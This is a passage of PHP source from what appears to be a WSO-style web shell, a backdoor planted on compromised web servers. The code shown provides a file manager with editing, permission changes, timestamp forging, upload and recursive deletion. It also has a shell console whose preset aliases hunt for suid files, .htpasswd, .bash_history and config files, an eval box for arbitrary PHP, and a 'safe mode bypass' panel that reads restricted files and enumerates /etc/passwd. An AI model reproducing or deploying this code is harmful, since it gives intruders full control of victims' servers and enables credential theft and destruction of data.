		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$oRb = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="submit"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value="submit"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="submit"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>';
			break;
		/* (С) 12.2015 mitryz */
		case 'frame':
			$frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
			if ($frameSrc[0] != '/')
				$frameSrc = '/' . $frameSrc;
			if ($frameSrc[strlen($frameSrc) - 1] != '/')
				$frameSrc = $frameSrc . '/';
			$frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
			echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
			break;
	}
	echo '</div>';
	hardFooter();
}
if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
    	"Find index.php in current dir" => "dir /s /w /b index.php",
    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
    	"Show active connections" => "netstat -an",
    	"Show running services" => "net start",
    	"User accounts" => "net user",
    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -lha",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
        "process status" => "ps aux",
		"Find" => "",
  		"find all suid files" => "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
  		"find all sgid files" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" => "find / -type f -name config.inc.php",
  		"find config* files" => "find / -type f -name \"config*\"",
  		"find config* files in current dir" => "find . -type f -name \"config*\"",
  		"find all writable folders and files" => "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find all service.pwd files" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find all .bash_history files" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf files" => "locate httpd.conf",
		"locate vhosts.conf files" => "locate vhosts.conf",
		"locate proftpd.conf files" => "locate proftpd.conf",
		"locate psybnc.conf files" => "locate psybnc.conf",
		"locate my.conf files" => "locate my.conf",
		"locate admin.php files" =>"locate admin.php",
		"locate cfg.php files" => "locate cfg.php",
		"locate conf.php files" => "locate conf.php",
		"locate config.dat files" => "locate config.dat",
		"locate config.php files" => "locate config.php",
		"locate config.inc files" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php files" => "locate config.default.php",
		"locate config* files " => "locate config",
		"locate .conf files"=>"locate '.conf'",
		"locate .pwd files" => "locate '.pwd'",
		"locate .sql files" => "locate '.sql'",
		"locate .htpasswd files" => "locate '.htpasswd'",
		"locate .bash_history files" => "locate '.bash_history'",
		"locate .mysql_history files" => "locate '.mysql_history'",
		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
		"locate backup files" => "locate backup",
		"locate dump files" => "locate dump",
		"locate priv files" => "locate priv"
	);
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif(!empty($_POST['p1']))
        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
	if(isset($_POST['ajax'])) {
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		echo "d.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "c_='".$GLOBALS['cwd']."';";
			}
		}
		echo "d.cf.output.value+='".$temp."';";
		echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	hardHeader();
    echo "<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}
</script>";
	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}

	echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
	}
	echo '</textarea><table style="border:1px solid #060a10;background-color:#060a10;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
	echo '</form></div><script>d.cf.cmd.focus();</script>';
	hardFooter();
}
function actionPhp() {
	if( isset($_POST['ajax']) ) {
		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
	hardHeader();
	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
		echo '<h1>PHP info</h1><div class=content>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
		$tmp = preg_replace('!body {.*}!msiU','',$tmp);
		$tmp = preg_replace('!a:\w+ {.*}!msiU','',$tmp);
		$tmp = preg_replace('!h1!msiU','h2',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		$tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU','',$tmp);
		echo $tmp;
		echo '</div><br>';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
		echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
	echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	hardFooter();
}
function actionFilesMan() {
    if (!empty ($_COOKIE['f']))
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);

	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if ( is_array($_FILES['f']['tmp_name']) ) {
					foreach ( $_FILES['f']['tmp_name'] as $i => $tmpName ) {
                        if(!@move_uploaded_file($tmpName, $_FILES['f']['name'][$i])) {
                                echo "Can't upload file!";
							}
						}
					}
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($▟ = readdir($dh) ) !== false) {
						$▟ = $path.$▟;
						if ( (basename($▟) == "..") || (basename($▟) == ".") )
							continue;
						$type = filetype($▟);
						if ($type == "dir")
							deleteDir($▟);
						else
							@unlink($▟);
					}
					closedir($dh);
					@rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
                        if($f == '..')
                            continue;
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_COOKIE['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
				} elseif($_COOKIE['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(@is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						@rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_COOKIE['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach($_COOKIE['f'] as $f) {
                                if($f == '..')
                                    continue;
                                if(@is_file($_COOKIE['c'].$f))
                                    $zip->addFile($_COOKIE['c'].$f, $f);
                                elseif(@is_dir($_COOKIE['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
				} elseif($_COOKIE['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_COOKIE['f'] as $f) {
                            if($zip->open($_COOKIE['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
				} elseif($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    ex('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
				break;
			default:
                if(!empty($_POST['p1'])) {
					prototype('act', $_POST['p1']);
					prototype('f', serialize(@$_POST['f']));
					prototype('c', @$_POST['c']);
				}
				break;
		}
	}
    hardHeader();
	echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
	$dirContent = hardScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';hardFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "<script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function cmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "cmp");
	usort($dirs, "cmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'frame\')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	echo "<tr id=fak><td colspan=7>
	<input type=hidden name=ne value=''>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	<label><select name='p1'>";
	if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>↳ Paste</option>";
	echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if(class_exists('ZipArchive'))
        echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>";
    echo "<option value='tar'>+ tar.gz</option>";
    echo "</select></label>";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
        echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
    echo "<input type='submit' value='submit'></td></tr></form></table></div>";
	hardFooter();
}
function actionStringTools() {
	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	$stringTools = array(
		'Base64 encode' => 'base64_encode',
		'Base64 decode' => 'base64_decode',
		'Url encode' => 'urlencode',
		'Url decode' => 'urldecode',
		'Full urlencode' => 'full_urlencode',
		'md5 hash' => 'md5',
		'sha1 hash' => 'sha1',
		'crypt' => 'crypt',
		'CRC32' => 'crc32',
		'ASCII to HEX' => 'ascii2hex',
		'HEX to ASCII' => 'hex2ascii',
		'HEX to DEC' => 'hexdec',
		'HEX to BIN' => 'hex2bin',
		'DEC to HEX' => 'dechex',
		'DEC to BIN' => 'decbin',
		'BIN to HEX' => 'binhex',
		'BIN to DEC' => 'bindec',
		'String to lower case' => 'strtolower',
		'String to upper case' => 'strtoupper',
		'Htmlspecialchars' => 'htmlspecialchars',
		'String length' => 'strlen',
	);
	if(isset($_POST['ajax'])) {
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		if(in_array($_POST['p1'], $stringTools))
			echo $_POST['p1']($_POST['p2']);
		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	hardHeader();
	echo '<h1>String conversions</h1><div class=content>';
	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><label><select name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select></label><input type='submit' value='submit'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"</pre></div><br><h1>Search files:</h1><div class=content>
		<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
			<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
			<tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr>
			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
			<tr><td></td><td><input type='submit' value='submit'></td></tr>
			</table></form>";
	function hardRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $▟) {
				if(@is_dir($▟)){
					if($path!=$▟)
						hardRecursiveGlob($▟);
				} else {
					if(empty($_POST['p2']) || @strpos(file_get_contents($▟), $_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($▟)."\", \"view\",\"\")'>".htmlspecialchars($▟)."</a><br>";
				}
			}
		}
	}
	if(@$_POST['p3'])
		hardRecursiveGlob($_POST['c']);
	echo "</div><br><h1>Search for hash:</h1><div class=content>
		<form method='post' target='_blank' name='hf'>
			<input type='text' name='hash' style='width:200px;'><br>
            <input type='hidden' name='act' value='find'/>
			<input type='submit' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
			<input type='submit' value='toolki.com' onclick=\"document.hf.action='https://toolki.com/';document.hf.submit()\"><br>
			<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\"><br>
			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='https://www.md5decrypter.com/';document.hf.submit()\"><br>
		</form></div>";
	hardFooter();
}
function actionSafeMode() {
	$temp='';
	ob_start();
	switch($_POST['p1']) {
		case 1:
			$temp=@tempnam($test, 'cx');
			if(@copy("compress.zlib://".$_POST['p2'], $temp)){
				echo @file_get_contents($temp);
				unlink($temp);
			} else
				echo 'Sorry... Can\'t open file';
			break;
		case 2:
			$files = glob($_POST['p2'].'*');
			if( is_array($files) )
				foreach ($files as $filename)
					echo $filename."\n";
			break;
		case 3:
			$ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH);
			curl_exec($ch);
			break;
		case 4:
			ini_restore("safe_mode");
			ini_restore("open_basedir");
			include($_POST['p2']);
			break;
		case 5:
			for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
				$uid = @posix_getpwuid($_POST['p2']);
				if ($uid)
					echo join(':',$uid)."\n";
			}
			break;
		case 6:
			if(!function_exists('imap_open'))break;
			$stream = imap_open($_POST['p2'], "", "");
			if ($stream == FALSE)
				break;
			echo imap_body($stream, 1);
			imap_close($stream);
			break;
	}
	$temp = ob_get_clean();
	hardHeader();
	echo '<h1>Safe mode bypass</h1><div class=content>';
	echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="submit"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value="submit"></form>';
	if($temp)
		echo '<pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre>';
	echo '</div>';
	hardFooter();
}
function actionLogout() {
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
	die("<div align='center'><div class='container'><div class='sky'><div class='text'>THANK YOU & BYE</div><div class='stars'></div><div class='stars1'></div><div class='stars2'></div><div class='shooting-stars'></div></div></div></div>


